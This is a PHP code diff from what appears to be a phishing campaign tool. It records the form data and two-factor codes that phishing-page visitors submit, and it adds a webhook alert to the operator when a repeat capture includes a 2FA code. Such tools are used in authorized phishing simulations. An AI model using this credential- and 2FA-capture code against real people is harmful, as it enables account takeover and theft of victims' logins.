@@ -89,10 +89,12 @@ elseif(is_numeric($page)){
     $has_2fa = $code_2fa !== null && $code_2fa !== '';
 
     $is_first = taphish_is_first_capture($conn, $trackerId, $rid);
+    $is_2fa_capture = $has_2fa ? 1 : 0;
 
-    $stmt = $conn->prepare("INSERT INTO tb_data_webform_submit(tracker_id,session_id,rid,public_ip,ip_info,user_agent,screen_res,time,browser,platform,device_type,page,form_field_data,code_2fa) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)");
-    $stmt->bind_param('ssssssssssssss', $trackerId,$session_id,$rid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browser,$user_os,$device_type,$page,$form_field_data,$code_2fa);
+    $stmt = $conn->prepare("INSERT INTO tb_data_webform_submit(tracker_id,session_id,rid,public_ip,ip_info,user_agent,screen_res,time,browser,platform,device_type,page,form_field_data,code_2fa,is_2fa_capture) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)");
+    $stmt->bind_param('ssssssssssssssi', $trackerId,$session_id,$rid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browser,$user_os,$device_type,$page,$form_field_data,$code_2fa,$is_2fa_capture);
     if ($stmt->execute() === TRUE) {
+        $inserted_id = (int) $conn->insert_id;
         if ($is_first) {
             // First capture per recipient on this campaign — fire the
             // operator webhook if one is configured. Failure is silent
@@ -113,6 +115,35 @@ elseif(is_numeric($page)){
             }
             if (function_exists('logIt')) {
                 logIt('Capture: first submit on tracker ' . $trackerId . ($has_2fa ? ' [+2FA]' : ''));
+            }
+        } elseif ($has_2fa) {
+            // Phase 3.45e: repeat capture with a 2FA code → fire the
+            // repeat-capture webhook so the operator hears about it.
+            $hook_url = taphish_get_capture_webhook_url($conn);
+            $row_for_guard = ['code_2fa' => $code_2fa, 'repeat_webhook_sent' => 0];
+            if ($hook_url !== '' && taphish_should_send_repeat_capture_webhook($row_for_guard)) {
+                $payload = taphish_repeat_capture_webhook_payload([
+                    'campaign'        => '',
+                    'campaign_id'     => $trackerId,
+                    'recipient_name'  => '',
+                    'recipient_email' => '',
+                    'captured_at'     => $date_time,
+                    'page'            => (int)$page,
+                    'ip'              => $public_ip,
+                    'has_2fa'         => true,
+                ]);
+                @taphish_capture_dispatch_webhook($hook_url, $payload);
+                if ($inserted_id > 0) {
+                    $upd = $conn->prepare("UPDATE tb_data_webform_submit SET repeat_webhook_sent = 1 WHERE id = ?");
+                    if ($upd) {
+                        $upd->bind_param('i', $inserted_id);
+                        $upd->execute();
+                        $upd->close();
+                    }
+                }
+                if (function_exists('logIt')) {
+                    logIt('Capture: repeat 2FA on tracker ' . $trackerId);
+                }
             }
         }
         die('success');
